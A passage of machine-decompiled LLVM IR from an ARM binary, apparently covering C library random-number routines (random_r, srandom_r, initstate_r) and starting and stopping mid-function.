  %v3_164e8 = load i32, i32* %v2_164e8, align 4
  store i32 %v3_164e8, i32* %r0.global-to-local, align 4
  %v3_164f0 = sub i32 %v4_164e0, %v3_164e8
  %v4_164f4 = sdiv i32 %v3_164f0, 4
  %v4_164f8 = sext i8 %v3_164d8 to i32
  store i32 %v4_164f8, i32* %r1.global-to-local, align 4
  %v4_16500 = mul i32 %v4_164f4, 5
  %v5_16500 = add i32 %v4_16500, %v4_164f8
  %v3_16508 = add i32 %v3_164e8, -4
  %v4_16508 = inttoptr i32 %v3_16508 to i32*
  store i32 %v5_16500, i32* %v4_16508, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_16510 = load i32, i32* %r6.global-to-local, align 4
  %v1_16510 = add i32 %v0_16510, -4
  %v2_16510 = inttoptr i32 %v1_16510 to i32*
  %v3_16510 = load i32, i32* %v2_16510, align 4
  %v2_16518 = udiv i32 %v3_16510, 5
  %v3_16518 = urem i32 %v3_16510, 5
  store i32 %v2_16518, i32* %r0.global-to-local, align 4
  store i32 %v3_16518, i32* %r1.global-to-local, align 4
  %v2_16520 = icmp ugt i32 %v3_16518, 3
  %v7_16520 = icmp eq i32 %v3_16518, 4
  store i1 %v7_16520, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r5.global-to-local, align 4
  %v2_16528 = xor i1 %v7_16520, true
  %v3_16528 = and i1 %v2_16520, %v2_16528
  br i1 %v3_16528, label %dec_label_pc_16590, label %dec_label_pc_1652c

dec_label_pc_1652c:                               ; preds = %bb
  %v4_16534 = mul nuw nsw i32 %v3_16518, 4
  %v5_16534 = add i32 %v4_16534, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2356)
  %v1_16538 = add i32 %v4_16534, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2336)
  %v2_16538 = inttoptr i32 %v1_16538 to i32*
  %v3_16538 = load i32, i32* %v2_16538, align 4
  store i32 %v3_16538, i32* %r5.global-to-local, align 4
  %v6_1653c = inttoptr i32 %v5_16534 to i32*
  %v7_1653c = load i32, i32* %v6_1653c, align 4
  store i32 %v7_1653c, i32* %r7.global-to-local, align 4
  %v2_16540 = icmp eq i32 %v3_16518, 0
  store i1 %v2_16540, i1* %cpsr_z.global-to-local, align 1
  %v1_16544 = trunc i32 %v3_16538 to i8
  %v2_16544 = load i32, i32* %r4.global-to-local, align 4
  %v3_16544 = add i32 %v2_16544, 13
  %v4_16544 = inttoptr i32 %v3_16544 to i8*
  store i8 %v1_16544, i8* %v4_16544, align 1
  %v0_16548 = load i32, i32* %r7.global-to-local, align 4
  %v1_16548 = trunc i32 %v0_16548 to i8
  %v2_16548 = load i32, i32* %r4.global-to-local, align 4
  %v3_16548 = add i32 %v2_16548, 14
  %v4_16548 = inttoptr i32 %v3_16548 to i8*
  store i8 %v1_16548, i8* %v4_16548, align 1
  %v0_1654c = load i32, i32* %r1.global-to-local, align 4
  %v1_1654c = trunc i32 %v0_1654c to i8
  %v2_1654c = load i32, i32* %r4.global-to-local, align 4
  %v3_1654c = add i32 %v2_1654c, 12
  %v4_1654c = inttoptr i32 %v3_1654c to i8*
  store i8 %v1_1654c, i8* %v4_1654c, align 1
  %v0_16550 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16550, label %dec_label_pc_1657c, label %dec_label_pc_16554

dec_label_pc_16554:                               ; preds = %dec_label_pc_1652c
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_16558 = load i32, i32* %r6.global-to-local, align 4
  %v1_16558 = add i32 %v0_16558, -4
  %v2_16558 = inttoptr i32 %v1_16558 to i32*
  %v3_16558 = load i32, i32* %v2_16558, align 4
  %v2_1655c = sdiv i32 %v3_16558, 5
  store i32 %v2_1655c, i32* %r0.global-to-local, align 4
  %v4_16560 = mul i32 %v2_1655c, 4
  %v5_16560 = add i32 %v4_16560, %v0_16558
  %v1_16564 = load i32, i32* %r4.global-to-local, align 4
  %v2_16564 = add i32 %v1_16564, 4
  %v3_16564 = inttoptr i32 %v2_16564 to i32*
  store i32 %v5_16560, i32* %v3_16564, align 4
  %v0_16568 = load i32, i32* %r7.global-to-local, align 4
  %v1_16568 = load i32, i32* %r0.global-to-local, align 4
  %v2_16568 = add i32 %v1_16568, %v0_16568
  %v0_1656c = load i32, i32* %r5.global-to-local, align 4
  %v2_16570 = udiv i32 %v2_16568, %v0_1656c
  %v3_16570 = urem i32 %v2_16568, %v0_1656c
  store i32 %v2_16570, i32* %r0.global-to-local, align 4
  %v0_16574 = load i32, i32* %r6.global-to-local, align 4
  %v4_16574 = mul i32 %v3_16570, 4
  %v5_16574 = add i32 %v0_16574, %v4_16574
  store i32 %v5_16574, i32* %r1.global-to-local, align 4
  %v1_16578 = load i32, i32* %r4.global-to-local, align 4
  %v2_16578 = inttoptr i32 %v1_16578 to i32*
  store i32 %v5_16574, i32* %v2_16578, align 4
  br label %dec_label_pc_1657c

dec_label_pc_1657c:                               ; preds = %dec_label_pc_1652c, %dec_label_pc_16554
  %v0_1657c = load i32, i32* %r6.global-to-local, align 4
  %v1_1657c = load i32, i32* %r5.global-to-local, align 4
  %v4_1657c = mul i32 %v1_1657c, 4
  %v5_1657c = add i32 %v4_1657c, %v0_1657c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16584 = load i32, i32* %r4.global-to-local, align 4
  %v2_16584 = add i32 %v1_16584, 16
  %v3_16584 = inttoptr i32 %v2_16584 to i32*
  store i32 %v5_1657c, i32* %v3_16584, align 4
  %v0_16588 = load i32, i32* %r6.global-to-local, align 4
  %v1_16588 = load i32, i32* %r4.global-to-local, align 4
  %v2_16588 = add i32 %v1_16588, 8
  %v3_16588 = inttoptr i32 %v2_16588 to i32*
  store i32 %v0_16588, i32* %v3_16588, align 4
  %v1_165a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165a0

dec_label_pc_16590:                               ; preds = %bb
  %v0_16590 = call i32 @__GI___errno_location()
  %v2_16598 = inttoptr i32 %v0_16590 to i32*
  store i32 22, i32* %v2_16598, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165a0

dec_label_pc_165a0:                               ; preds = %dec_label_pc_1657c, %dec_label_pc_16590
  %v1_165a8 = phi i32 [ %v1_165a8.pre, %dec_label_pc_1657c ], [ -1, %dec_label_pc_16590 ]
  %v2_165a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_165a4, i32* @r4, align 4
  ret i32 %v1_165a8

; uselistorder directives
  uselistorder i32 %v0_1656c, { 1, 0 }
  uselistorder i32 %v2_16568, { 1, 0 }
  uselistorder i32 %v3_16510, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 8, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_165a0, { 1, 0 }
  uselistorder label %dec_label_pc_1657c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_165b4 = load i32, i32* @r4, align 4
  store i32 %v3_165b4, i32* %stack_var_-8, align 4
  %v1_165b8 = add i32 %tmp, 12
  %v2_165b8 = inttoptr i32 %v1_165b8 to i8*
  %v3_165b8 = load i8, i8* %v2_165b8, align 1
  %v4_165b8 = sext i8 %v3_165b8 to i32
  store i32 %v4_165b8, i32* %r3.global-to-local, align 4
  %v2_165bc = icmp eq i8 %v3_165b8, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_165c8 = add i32 %tmp, 8
  %v2_165c8 = inttoptr i32 %v1_165c8 to i32*
  %v3_165c8 = load i32, i32* %v2_165c8, align 4
  store i32 %v3_165c8, i32* %lr.global-to-local, align 4
  br i1 %v2_165bc, label %dec_label_pc_165d0, label %dec_label_pc_165f4

dec_label_pc_165d0:                               ; preds = %entry
  %v1_165d0 = inttoptr i32 %v3_165c8 to i32*
  %v2_165d0 = load i32, i32* %v1_165d0, align 4
  store i32 %v2_165d0, i32* %r2.global-to-local, align 4
  %v2_165d8 = mul i32 %v2_165d0, 1103515245
  %v1_165e0 = add i32 %v2_165d8, 12345
  %tmp6 = bitcast i32 %v1_165e0 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_165e4 = bitcast float %tmp7 to i32
  store i32 %v1_165e4, i32* %r3.global-to-local, align 4
  store i32 %v1_165e4, i32* %v1_165d0, align 4
  %v0_165ec = load i32, i32* %r3.global-to-local, align 4
  %v2_165ec = inttoptr i32 %arg2 to i32*
  store i32 %v0_165ec, i32* %v2_165ec, align 4
  br label %dec_label_pc_16634

dec_label_pc_165f4:                               ; preds = %entry
  %v2_165f4 = load i32, i32* %arg1, align 4
  store i32 %v2_165f4, i32* %r2.global-to-local, align 4
  %v1_165f8 = add i32 %tmp, 4
  %v2_165f8 = inttoptr i32 %v1_165f8 to i32*
  %v3_165f8 = load i32, i32* %v2_165f8, align 4
  store i32 %v3_165f8, i32* %r0.global-to-local, align 4
  %v1_165fc = inttoptr i32 %v2_165f4 to i32*
  %v2_165fc = load i32, i32* %v1_165fc, align 4
  store i32 %v2_165fc, i32* %r1.global-to-local, align 4
  %v1_16600 = inttoptr i32 %v3_165f8 to i32*
  %v2_16600 = load i32, i32* %v1_16600, align 4
  %v4_16600 = add i32 %v3_165f8, 4
  store i32 %v4_16600, i32* %r0.global-to-local, align 4
  %v2_16604 = add i32 %v2_16600, %v2_165fc
  store i32 %v2_16604, i32* %r3.global-to-local, align 4
  store i32 %v2_16604, i32* %v1_165fc, align 4
  %v3_16608 = load i32, i32* %r2.global-to-local, align 4
  %v4_16608 = add i32 %v3_16608, 4
  store i32 %v4_16608, i32* %r2.global-to-local, align 4
  %v0_1660c = load i32, i32* %ip.global-to-local, align 4
  %v1_1660c = add i32 %v0_1660c, 16
  %v2_1660c = inttoptr i32 %v1_1660c to i32*
  %v3_1660c = load i32, i32* %v2_1660c, align 4
  store i32 %v3_1660c, i32* %r1.global-to-local, align 4
  %v0_16610 = load i32, i32* %r3.global-to-local, align 4
  %v3_16610 = udiv i32 %v0_16610, 2
  store i32 %v3_16610, i32* %r3.global-to-local, align 4
  %v3_16614 = icmp ult i32 %v4_16608, %v3_1660c
  %v1_16618 = load i32, i32* %r4.global-to-local, align 4
  %v2_16618 = inttoptr i32 %v1_16618 to i32*
  store i32 %v3_16610, i32* %v2_16618, align 4
  br i1 %v3_16614, label %dec_label_pc_16624, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_165f4
  %v1_1661c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_1661c, i32* %r2.global-to-local, align 4
  %v0_1662c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_16624:                               ; preds = %dec_label_pc_165f4
  %v0_16624 = load i32, i32* %r0.global-to-local, align 4
  %v1_16624 = load i32, i32* %r1.global-to-local, align 4
  %v3_16624 = icmp ult i32 %v0_16624, %v1_16624
  br i1 %v3_16624, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_16624
  %v1_16628 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_16628, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_16624, %._crit_edge, %bb
  %v0_1662c = phi i32 [ %v0_1662c.pre, %._crit_edge ], [ %v0_16624, %dec_label_pc_16624 ], [ %v1_16628, %bb ]
  %v1_1662c = load i32, i32* %ip.global-to-local, align 4
  %v2_1662c = add i32 %v1_1662c, 4
  %v3_1662c = inttoptr i32 %v2_1662c to i32*
  store i32 %v0_1662c, i32* %v3_1662c, align 4
  %v0_16630 = load i32, i32* %r2.global-to-local, align 4
  %v1_16630 = load i32, i32* %ip.global-to-local, align 4
  %v2_16630 = inttoptr i32 %v1_16630 to i32*
  store i32 %v0_16630, i32* %v2_16630, align 4
  br label %dec_label_pc_16634

dec_label_pc_16634:                               ; preds = %dec_label_pc_165d0, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_16638 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16638, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_16610, { 1, 0 }
  uselistorder i32 %v1_165e4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_16634, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16644 = load i32, i32* @r4, align 4
  store i32 %v3_16644, i32* %stack_var_-36, align 4
  %v1_16648 = add i32 %tmp, 12
  %v2_16648 = inttoptr i32 %v1_16648 to i8*
  %v3_16648 = load i8, i8* %v2_16648, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_16658 = load i8, i8* %v2_16648, align 1
  %tmp33 = icmp ugt i8 %v3_16648, 4
  br i1 %tmp33, label %.dec_label_pc_16704_crit_edge, label %dec_label_pc_16664

.dec_label_pc_16704_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_16704

dec_label_pc_16664:                               ; preds = %entry
  %v0_16664 = load i32, i32* @r0, align 4
  %v2_16664 = icmp eq i32 %v0_16664, 0
  %v1_16668 = add i32 %tmp, 8
  %v2_16668 = inttoptr i32 %v1_16668 to i32*
  %v3_16668 = load i32, i32* %v2_16668, align 4
  store i32 %v3_16668, i32* %r6.global-to-local, align 4
  br i1 %v2_16664, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_16664
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_16664, %bb
  %v0_16674 = phi i32 [ %v0_16664, %dec_label_pc_16664 ], [ 1, %bb ]
  %v2_16670 = icmp eq i8 %v3_16658, 0
  %v2_16674 = inttoptr i32 %v3_16668 to i32*
  store i32 %v0_16674, i32* %v2_16674, align 4
  br i1 %v2_16670, label %dec_label_pc_16700, label %dec_label_pc_1667c

dec_label_pc_1667c:                               ; preds = %bb23
  %v1_1667c = add i32 %tmp, 13
  %v2_1667c = inttoptr i32 %v1_1667c to i8*
  %v3_1667c = load i8, i8* %v2_1667c, align 1
  %v4_1667c = sext i8 %v3_1667c to i32
  store i32 %v4_1667c, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_16688 = load i32, i32* @r0, align 4
  store i32 %v0_16688, i32* %r4.global-to-local, align 4
  %v0_1668c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1668c, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_166cc25 = icmp sgt i8 %v3_1667c, 1
  br i1 %v5_166cc25, label %dec_label_pc_16698, label %dec_label_pc_166d0

dec_label_pc_16698:                               ; preds = %dec_label_pc_1667c, %dec_label_pc_16698.dec_label_pc_16698_crit_edge
  %v1_166ac = phi i32 [ %v1_166ac.pre, %dec_label_pc_16698.dec_label_pc_16698_crit_edge ], [ 2836, %dec_label_pc_1667c ]
  %v1_166a0 = phi i32 [ %v1_166a0.pre, %dec_label_pc_16698.dec_label_pc_16698_crit_edge ], [ 16807, %dec_label_pc_1667c ]
  %v0_1669c27 = phi i32 [ %v0_166c0.pre, %dec_label_pc_16698.dec_label_pc_16698_crit_edge ], [ %v0_16688, %dec_label_pc_1667c ]
  %v1_166b826 = phi i32 [ %v5_166b8, %dec_label_pc_16698.dec_label_pc_16698_crit_edge ], [ %v0_1668c, %dec_label_pc_1667c ]
  %v3_16698 = urem i32 %v0_1669c27, ptrtoint ([59 x i8]* @global_var_1f31d.1189 to i32)
  %v2_166a0 = mul i32 %v1_166a0, %v3_16698
  %v2_166a8 = sdiv i32 %v0_1669c27, ptrtoint ([59 x i8]* @global_var_1f31d.1189 to i32)
  %v2_166ac = mul i32 %v1_166ac, %v2_166a8
  %v2_166b0 = sub i32 %v2_166a0, %v2_166ac
  %v8_166b0 = icmp slt i32 %v2_166b0, 0
  %v2_166b4 = add i32 %v2_166b0, 2147483647
  %v2_166b4.v2_166b0 = select i1 %v8_166b0, i32 %v2_166b4, i32 %v2_166b0
  store i32 %v2_166b4.v2_166b0, i32* %r4.global-to-local, align 4
  %v2_166b8 = add i32 %v1_166b826, 4
  %v3_166b8 = inttoptr i32 %v2_166b8 to i32*
  store i32 %v2_166b4.v2_166b0, i32* %v3_166b8, align 4
  %v4_166b8 = load i32, i32* %r8.global-to-local, align 4
  %v5_166b8 = add i32 %v4_166b8, 4
  store i32 %v5_166b8, i32* %r8.global-to-local, align 4
  %v0_166bc.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_166bc.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_166c0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_166c8 = add i32 %v0_166bc.pre, 1
  store i32 %v1_166c8, i32* %r7.global-to-local, align 4
  %v5_166cc = icmp slt i32 %v0_166bc.pre, %v1_166bc.pre
  br i1 %v5_166cc, label %dec_label_pc_16698.dec_label_pc_16698_crit_edge, label %dec_label_pc_166bc.dec_label_pc_166d0_crit_edge

dec_label_pc_16698.dec_label_pc_16698_crit_edge:  ; preds = %dec_label_pc_16698
  %v1_166a0.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_166ac.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16698

dec_label_pc_166bc.dec_label_pc_166d0_crit_edge:  ; preds = %dec_label_pc_16698
  %v0_166e0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_166d0

dec_label_pc_166d0:                               ; preds = %dec_label_pc_166bc.dec_label_pc_166d0_crit_edge, %dec_label_pc_1667c
  %v0_166e0 = phi i32 [ %v0_166e0.pre, %dec_label_pc_166bc.dec_label_pc_166d0_crit_edge ], [ %v0_1668c, %dec_label_pc_1667c ]
  %v0_166d4.lcssa = phi i32 [ %v1_166bc.pre, %dec_label_pc_166bc.dec_label_pc_166d0_crit_edge ], [ %v4_1667c, %dec_label_pc_1667c ]
  %v2_166d4 = mul i32 %v0_166d4.lcssa, 10
  store i32 %v2_166d4, i32* @r4, align 4
  %v0_166d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_166d8 = add i32 %v0_166d8, 14
  %v2_166d8 = inttoptr i32 %v1_166d8 to i8*
  %v3_166d8 = load i8, i8* %v2_166d8, align 1
  %v4_166d8 = sext i8 %v3_166d8 to i32
  %v2_166dc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_166dc, i32* %r7.global-to-local, align 4
  %v4_166e0 = mul nsw i32 %v4_166d8, 4
  %v5_166e0 = add i32 %v0_166e0, %v4_166e0
  %v1_166e4 = inttoptr i32 %v0_166d8 to i32*
  store i32 %v5_166e0, i32* %v1_166e4, align 4
  %v3_166e4 = add i32 %v0_166d8, 4
  %v4_166e4 = inttoptr i32 %v3_166e4 to i32*
  %v5_166e4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_166e4, i32* %v4_166e4, align 4
  br label %dec_label_pc_166f0

dec_label_pc_166ec:                               ; preds = %dec_label_pc_166f0
  %v0_166f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_166ec = inttoptr i32 %v0_166f4 to i32*
  %v3_166ec = call i32 @__GI_random_r(i32* %v2_166ec, i32 %v2_166dc)
  br label %dec_label_pc_166f0

dec_label_pc_166f0:                               ; preds = %dec_label_pc_166d0, %dec_label_pc_166ec
  %v0_166f0 = load i32, i32* @r4, align 4
  %v1_166f0 = add i32 %v0_166f0, -1
  store i32 %v1_166f0, i32* @r4, align 4
  %v6_166f0 = icmp slt i32 %v1_166f0, 0
  br i1 %v6_166f0, label %dec_label_pc_16700, label %dec_label_pc_166ec

dec_label_pc_16700:                               ; preds = %dec_label_pc_166f0, %bb23
  %v2_16708.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_16704

dec_label_pc_16704:                               ; preds = %.dec_label_pc_16704_crit_edge, %dec_label_pc_16700
  %v2_16708 = phi i32 [ %v3_16644, %.dec_label_pc_16704_crit_edge ], [ %v2_16708.pre, %dec_label_pc_16700 ]
  %v1_1670c = phi i32 [ -1, %.dec_label_pc_16704_crit_edge ], [ 0, %dec_label_pc_16700 ]
  store i32 %v2_16708, i32* @r4, align 4
  ret i32 %v1_1670c

; uselistorder directives
  uselistorder i32 %v1_166f0, { 1, 0 }
  uselistorder i32 %v0_166d8, { 1, 0, 2 }
  uselistorder i32 %v0_166bc.pre, { 1, 0 }
  uselistorder i32 %v5_166b8, { 1, 0 }
  uselistorder i32 %v0_1669c27, { 1, 0 }
  uselistorder i32 %v0_1668c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([59 x i8]* @global_var_1f31d.1189 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_16704, { 1, 0 }
  uselistorder label %dec_label_pc_166f0, { 1, 0 }
  uselistorder label %dec_label_pc_16698, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16710:
  %v0_16710 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16710, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16710
  %v2_16710 = load i32, i32* @r7, align 4
  %v5_16710 = udiv i32 %v2_16710, 8
  %v6_16710 = and i32 %v5_16710, %arg1
  %v3_16714 = load i32, i32* @fp, align 4
  %v8_16714 = shl i32 %v6_16710, %v3_16714
  %v9_16714 = and i32 %v8_16714, %arg1
  %v2_16718 = load i32, i32* @sp, align 4
  %v8_16718 = shl i32 %v2_16718, %arg3
  %v9_16718 = and i32 %v8_16718, %arg2
  call void @__pseudo_branch(i32 %v9_16718)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16710, %bb
  %v10_16718 = phi i32 [ %arg1, %dec_label_pc_16710 ], [ %v9_16714, %bb ]
  ret i32 %v10_16718

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_1671c = load i32, i32* @r4, align 4
  %v6_1671c = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_1674c, label %dec_label_pc_1673c

dec_label_pc_1673c:                               ; preds = %entry
  %v2_1673c = icmp ugt i32 %arg2, 254
  %v7_1673c = icmp eq i32 %arg2, 255
  %v2_16740 = xor i1 %v7_1673c, true
  %v3_16740 = and i1 %v2_1673c, %v2_16740
  br i1 %v3_16740, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_1673c
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1673c, %bb
  %v1_167787 = phi i32 [ %v3_1671c, %dec_label_pc_1673c ], [ 4, %bb ]
  %v2_16744 = xor i1 %v2_1673c, true
  %v3_16744 = or i1 %v7_1673c, %v2_16744
  br i1 %v3_16744, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_1674c:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_16764, label %dec_label_pc_16754

dec_label_pc_16754:                               ; preds = %dec_label_pc_1674c
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_167d4

.thread10:                                        ; preds = %dec_label_pc_16754
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_16764:                               ; preds = %dec_label_pc_1674c
  %v2_16764 = icmp ugt i32 %arg2, 62
  %v7_16764 = icmp eq i32 %arg2, 63
  %v2_16768 = xor i1 %v7_16764, true
  %v3_16768 = and i1 %v2_16764, %v2_16768
  br i1 %v3_16768, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_16764
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_16764, %bb23
  %v1_167786 = phi i32 [ %v3_1671c, %dec_label_pc_16764 ], [ 2, %bb23 ]
  %v2_1676c = xor i1 %v2_16764, true
  %v3_1676c = or i1 %v7_16764, %v2_1676c
  br i1 %v3_1676c, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_16784 = phi i32 [ 3, %bb22 ], [ %v1_167787, %bb21 ], [ %v1_167786, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2356), i32* %r3.global-to-local, align 4
  %v4_16778 = mul i32 %v1_16784, 4
  %v5_16778 = add i32 %v4_16778, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2356)
  store i32 %v5_16778, i32* %r2.global-to-local, align 4
  %v1_1677c = add i32 %v4_16778, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2336)
  %v2_1677c = inttoptr i32 %v1_1677c to i32*
  %v3_1677c = load i32, i32* %v2_1677c, align 4
  store i32 %v3_1677c, i32* %r1.global-to-local, align 4
  %v1_16780 = add i32 %tmp, 4
  store i32 %v1_16780, i32* @r6, align 4
  %v6_16784 = inttoptr i32 %v5_16778 to i32*
  %v7_16784 = load i32, i32* %v6_16784, align 4
  store i32 %v7_16784, i32* %r2.global-to-local, align 4
  %v4_16788 = mul i32 %v3_1677c, 4
  %v5_16788 = add i32 %v4_16788, %v1_16780
  store i32 %v5_16788, i32* %r3.global-to-local, align 4
  %v2_1678c = add i32 %arg3, 16
  %v3_1678c = inttoptr i32 %v2_1678c to i32*
  store i32 %v5_16788, i32* %v3_1678c, align 4
  %v0_16790 = load i32, i32* %r2.global-to-local, align 4
  %v1_16790 = trunc i32 %v0_16790 to i8
  %v2_16790 = load i32, i32* @r5, align 4
  %v3_16790 = add i32 %v2_16790, 14
  %v4_16790 = inttoptr i32 %v3_16790 to i8*
  store i8 %v1_16790, i8* %v4_16790, align 1
  %v0_16794 = load i32, i32* %r1.global-to-local, align 4
  %v1_16794 = trunc i32 %v0_16794 to i8
  %v2_16794 = load i32, i32* @r5, align 4
  %v3_16794 = add i32 %v2_16794, 13
  %v4_16794 = inttoptr i32 %v3_16794 to i8*
  store i8 %v1_16794, i8* %v4_16794, align 1
  %v0_16798 = load i32, i32* @r4, align 4
  %v1_16798 = trunc i32 %v0_16798 to i8
  %v2_16798 = load i32, i32* @r5, align 4
  %v3_16798 = add i32 %v2_16798, 12
  %v4_16798 = inttoptr i32 %v3_16798 to i8*
  store i8 %v1_16798, i8* %v4_16798, align 1
  %v0_1679c = load i32, i32* @r6, align 4
  %v1_1679c = load i32, i32* @r5, align 4
  %v2_1679c = add i32 %v1_1679c, 8
  %v3_1679c = inttoptr i32 %v2_1679c to i32*
  store i32 %v0_1679c, i32* %v3_1679c, align 4
  %v0_167a0 = load i32, i32* @r5, align 4
  store i32 %v0_167a0, i32* %r1.global-to-local, align 4
  %v0_167a4 = load i32, i32* @r0, align 4
  %v2_167a4 = inttoptr i32 %v0_167a4 to i32*
  %v3_167a4 = call i32 @srandom_r(i32* %v2_167a4, i32 %v0_167a0)
  store i32 %v3_167a4, i32* %r0.global-to-local, align 4
  %v0_167a8 = load i32, i32* @r4, align 4
